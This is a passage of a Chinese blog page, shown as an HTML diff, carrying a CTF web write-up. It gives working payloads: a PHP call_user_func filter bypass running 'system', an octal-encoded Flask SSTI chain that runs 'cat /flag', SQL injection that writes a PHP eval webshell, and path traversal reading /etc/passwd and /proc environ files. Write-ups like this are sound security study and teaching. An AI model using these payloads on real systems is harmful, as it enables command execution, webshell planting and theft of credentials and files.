class="hljs-variable">$num</span> != <span class="hljs-number">1234</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;看来第一层对你来说是小case&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$num</span>) &amp;&amp; <span class="hljs-variable">$num</span> &gt; <span class="hljs-number">1234</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;还是有点实力的嘛&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$new</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$star</span>)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;看起来你遇到难关了哈哈&lt;br&gt;&quot;</span>;<br>            <span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-variable">$new</span>); <br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$b</span>) &#123; <br>                <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$b</span>, <span class="hljs-variable">$star</span>); <br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;恭喜你，又成长了&lt;br&gt;&quot;</span>;<br>            &#125; <br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>很明显要我们去利用调用函数call_user_func调用函数去命令执行。首先前两个判断很简单就能绕过。后面的话是一个黑名单过滤了很多函数。但是这里可以使用<code>readgzfile</code>函数</p>
+<h3 id="readgzfile"><a href="#readgzfile" class="headerlink" title="readgzfile"></a>readgzfile</h3><p>该函数用于输出一个 <code>.gz</code> 文件的内容</p>
+<p>但是对于非 gzip 格式的文件，直接读取内容</p>
+<hr>
+<p>payload：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">num</span>=1235<br><br>post:<br><span class="hljs-attribute">new</span>=readgzfile&amp;star=/flag<br></code></pre></td></tr></table></figure>
+
+<p>还有一种解法：</p>
+<p>我们可以使用<code>\</code>符号开头，这不会影响函数的调用，并且这里的过滤只是将整个字符串去在黑名单中比对，并不是字符串匹配过滤或者正则过滤。</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">num</span>=1235<br><br>post:<br><span class="hljs-attribute">new</span>=\system&amp;star=cat /flag<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="ezflask"><a href="#ezflask" class="headerlink" title="ezflask"></a>ezflask</h2><p>简单的ssti，使用八进制绕过，先用脚本查找可用类</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">&#123;&#123;&#x27;&#x27;[<span class="hljs-string">&quot;<span class="hljs-char escape_">\13</span>7<span class="hljs-char escape_">\13</span>7<span class="hljs-char escape_">\14</span>3<span class="hljs-char escape_">\15</span>4<span class="hljs-char escape_">\14</span>1<span class="hljs-char escape_">\16</span>3<span class="hljs-char escape_">\16</span>3<span class="hljs-char escape_">\13</span>7<span class="hljs-char escape_">\13</span>7&quot;</span>][<span class="hljs-string">&quot;<span class="hljs-char escape_">\13</span>7<span class="hljs-char escape_">\13</span>7<span class="hljs-char escape_">\15</span>5<span class="hljs-char escape_">\16</span>2<span class="hljs-char escape_">\15</span>7<span class="hljs-char escape_">\13</span>7<span class="hljs-char escape_">\13</span>7&quot;</span>][<span class="hljs-number">1</span>][<span class="hljs-string">&quot;<span class="hljs-char escape_">\13</span>7<span class="hljs-char escape_">\13</span>7<span class="hljs-char escape_">\16</span>3<span class="hljs-char escape_">\16</span>5<span class="hljs-char escape_">\14</span>2<span class="hljs-char escape_">\14</span>3<span class="hljs-char escape_">\15</span>4<span class="hljs-char escape_">\14</span>1<span class="hljs-char escape_">\16</span>3<span class="hljs-char escape_">\16</span>3<span class="hljs-char escape_">\14</span>5<span class="hljs-char escape_">\16</span>3<span class="hljs-char escape_">\13</span>7<span class="hljs-char escape_">\13</span>7&quot;</span>]()[<span class="hljs-number">133</span>][<span class="hljs-string">&quot;<span class="hljs-char escape_">\13</span>7<span class="hljs-char escape_">\13</span>7<span class="hljs-char escape_">\15</span>1<span class="hljs-char escape_">\15</span>6<span class="hljs-char escape_">\15</span>1<span class="hljs-char escape_">\16</span>4<span class="hljs-char escape_">\13</span>7<span class="hljs-char escape_">\13</span>7&quot;</span>][<span class="hljs-string">&quot;<span class="hljs-char escape_">\13</span>7<span class="hljs-char escape_">\13</span>7<span class="hljs-char escape_">\14</span>7<span class="hljs-char escape_">\15</span>4<span class="hljs-char escape_">\15</span>7<span class="hljs-char escape_">\14</span>2<span class="hljs-char escape_">\14</span>1<span class="hljs-char escape_">\15</span>4<span class="hljs-char escape_">\16</span>3<span class="hljs-char escape_">\13</span>7<span class="hljs-char escape_">\13</span>7&quot;</span>][&#x27;\<span class="hljs-number">137</span>\<span class="hljs-number">137</span>\<span class="hljs-number">142</span>\<span class="hljs-number">165</span>\<span class="hljs-number">151</span>\<span class="hljs-number">154</span>\<span class="hljs-number">164</span>\<span class="hljs-number">151</span>\<span class="hljs-number">156</span>\<span class="hljs-number">163</span>\<span class="hljs-number">137</span>\<span class="hljs-number">137</span>&#x27;][&#x27;\<span class="hljs-number">145</span>\<span class="hljs-number">166</span>\<span class="hljs-number">141</span>\<span class="hljs-number">154</span>&#x27;](<span class="hljs-string">&quot;<span class="hljs-char escape_">\13</span>7<span class="hljs-char escape_">\13</span>7<span class="hljs-char escape_">\15</span>1<span class="hljs-char escape_">\15</span>5<span class="hljs-char escape_">\16</span>0<span class="hljs-char escape_">\15</span>7<span class="hljs-char escape_">\16</span>2<span class="hljs-char escape_">\16</span>4<span class="hljs-char escape_">\13</span>7<span class="hljs-char escape_">\13</span>7<span class="hljs-char escape_">\05</span>0<span class="hljs-char escape_">\04</span>7<span class="hljs-char escape_">\15</span>7<span class="hljs-char escape_">\16</span>3<span class="hljs-char escape_">\04</span>7<span class="hljs-char escape_">\05</span>1<span class="hljs-char escape_">\05</span>6<span class="hljs-char escape_">\16</span>0<span class="hljs-char escape_">\15</span>7<span class="hljs-char escape_">\16</span>0<span class="hljs-char escape_">\14</span>5<span class="hljs-char escape_">\15</span>6<span class="hljs-char escape_">\05</span>0<span class="hljs-char escape_">\04</span>7<span class="hljs-char escape_">\14</span>3<span class="hljs-char escape_">\14</span>1<span class="hljs-char escape_">\16</span>4<span class="hljs-char escape_">\40</span><span class="hljs-char escape_">\57</span><span class="hljs-char escape_">\14</span>6<span class="hljs-char escape_">\15</span>4<span class="hljs-char escape_">\14</span>1<span class="hljs-char escape_">\14</span>7<span class="hljs-char escape_">\04</span>7<span class="hljs-char escape_">\05</span>1<span class="hljs-char escape_">\05</span>6<span class="hljs-char escape_">\16</span>2<span class="hljs-char escape_">\14</span>5<span class="hljs-char escape_">\14</span>1<span class="hljs-char escape_">\14</span>4<span class="hljs-char escape_">\05</span>0<span class="hljs-char escape_">\05</span>1&quot;</span>)&#125;&#125;<br></code></pre></td></tr></table></figure>
+
+<p>我用的是fenjing一把梭。</p>
+<hr>
+<h2 id="ezsql1-0"><a href="#ezsql1-0" class="headerlink" title="ezsql1.0"></a>ezsql1.0</h2><p><img src="/../image/%E2%80%9C%E8%BD%A9%E8%BE%95%E6%9D%AF%E2%80%9D%E4%BA%91%E7%9B%BE%E7%A0%BA%E5%89%91CTF%E6%8C%91%E6%88%98%E8%B5%9B%E5%A4%8D%E7%8E%B0-1.png"></p>
+<p>sql注入题，先fuzz测试一波，发现过滤了空格。然后这里是整形注入，3列</p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-number">1</span><span class="hljs-keyword">select</span>	发现能够正常查询，说明<span class="hljs-keyword">select</span>会被替换成空<br></code></pre></td></tr></table></figure>
+
+<p>然后空格这里可以使用<code>%09</code>和<code>/**/</code>绕过</p>
+<p>并且这里是有写入权限的，可以写入webshell，也可以使用联合查询，但是要注意使用复写绕过select过滤和绕过空格过滤</p>
+<p>写入webshell</p>
+<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">?id=<span class="hljs-number">-1</span>%09union%09seselectlect%091,%27%3C?=<span class="hljs-keyword">eval</span>($_POST[<span class="hljs-number">1</span>]);?%3E%27,<span class="hljs-number">3</span>%09into%09outfile%09%27/var/www/html/<span class="hljs-number">1.</span>php%27#<br></code></pre></td></tr></table></figure>
+
+<p>蚁剑连接在&#x2F;var&#x2F;db.sql这里找到flag的base64编码后的值，然后解码即可。</p>
+<p>也可以使用联合查询</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">?id=<span class="hljs-number">0</span><span class="hljs-comment">/**/</span><span class="hljs-built_in">union</span><span class="hljs-comment">/**/</span>selselectect<span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(data)<span class="hljs-comment">/**/</span><span class="hljs-built_in">from</span><span class="hljs-comment">/**/</span>flag<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="ez-web1"><a href="#ez-web1" class="headerlink" title="ez_web1"></a>ez_web1</h2><p>参考博客：<a target="_blank" rel="noopener" href="https://blog.csdn.net/u011435712/article/details/46529759">https://blog.csdn.net/u011435712/article/details/46529759</a></p>
+<h3 id="proc"><a href="#proc" class="headerlink" title="proc"></a>proc</h3><p>在 &#x2F;proc 目录里, 每个正在运行的进程都有一个以该进程 ID 命名的子目录, 其下包括如下的目录和伪文件：</p>
+<p>该文件保存了进程的完整 命令行. 如果该进程已经被交换出内存, 或者该进程已经僵死, 那么就没有任何东西在该文件里, 这时候对该文件的读操作将返回零个字符. 该文件以空字符 null 而不是换行符作为结束标志.</p>
+<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-regexp">/proc/</span><span class="hljs-keyword">self</span><span class="hljs-operator">/</span>environ 当前进程的环境变量<br><span class="hljs-regexp">/proc/</span><span class="hljs-keyword">self</span><span class="hljs-operator">/</span>cmdline 文件查看当前进行进程执行命令<br><span class="hljs-regexp">/proc/</span>[pid]<span class="hljs-operator">/</span>fd 当程序打开一个文件, 会获得程序的文件描述符, 而此时如果文件被删除, 只会删除文件的目录项, 不会清空文件的内容, 原来的进程依然可以通过描述符对文件进行读取, 也就是说, 文件还存在内存里<span class="hljs-operator">。</span><br><span class="hljs-regexp">/proc/</span>net<span class="hljs-regexp">/fib_trie、/</span>proc<span class="hljs-regexp">/net/</span>arp<span class="hljs-operator">、/</span>proc<span class="hljs-regexp">/net/</span>route 内网探测<br><span class="hljs-regexp">/sys/</span><span class="hljs-keyword">class</span><span class="hljs-regexp">/net/</span>eth0<span class="hljs-operator">/</span>address mac地址<br></code></pre></td></tr></table></figure>
+
+<hr>
+<p><img src="/../image/%E2%80%9C%E8%BD%A9%E8%BE%95%E6%9D%AF%E2%80%9D%E4%BA%91%E7%9B%BE%E7%A0%BA%E5%89%91CTF%E6%8C%91%E6%88%98%E8%B5%9B%E5%A4%8D%E7%8E%B0-2.png"></p>
+<p>查看网页源码得到提示账号为<code>fly233</code>，密码是<code>123456789</code></p>
+<p><img src="/../image/%E2%80%9C%E8%BD%A9%E8%BE%95%E6%9D%AF%E2%80%9D%E4%BA%91%E7%9B%BE%E7%A0%BA%E5%89%91CTF%E6%8C%91%E6%88%98%E8%B5%9B%E5%A4%8D%E7%8E%B0-3.png"></p>
+<p>进入另一个页面，有三个按钮随便点一个，然后发现有传参</p>
+<p><img src="/../image/%E2%80%9C%E8%BD%A9%E8%BE%95%E6%9D%AF%E2%80%9D%E4%BA%91%E7%9B%BE%E7%A0%BA%E5%89%91CTF%E6%8C%91%E6%88%98%E8%B5%9B%E5%A4%8D%E7%8E%B0-4.png"></p>
+<p>发现可以路径穿越、目录遍历</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">book_path=..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc/passwd<br></code></pre></td></tr></table></figure>
+
+<p><img src="/../image/%E2%80%9C%E8%BD%A9%E8%BE%95%E6%9D%AF%E2%80%9D%E4%BA%91%E7%9B%BE%E7%A0%BA%E5%89%91CTF%E6%8C%91%E6%88%98%E8%B5%9B%E5%A4%8D%E7%8E%B0-5.png"></p>
+<p>最后在<code>/proc/1/environ</code>找到flag</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">book_path=..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>proc<span class="hljs-regexp">/1/</span>environ<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
+    </div>
+</article>
+
+
+
+
+
     <div id="comments">
     <script>
         {
@@ -2552,6 +2822,13 @@
     </script>
 </div>
 
+
+
+    
+
+
+
+
     </div>
     <div class="copyright">
         <p class="footer-entry">
@@ -2560,11 +2837,11 @@
 <p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
 
     </div>
-</div>
-<div class="full-toc">
-    <button class="full" data-title="Toggle full screen shortcut key s"><span class="min "></span></button>
+    <div class="full-toc">
+        <button class="full" data-title="Toggle full screen shortcut key s"><span class="min "></span></button>
 <a class="" id="rocket" ></a>
 
+    </div>
 </div>
 
 </body>
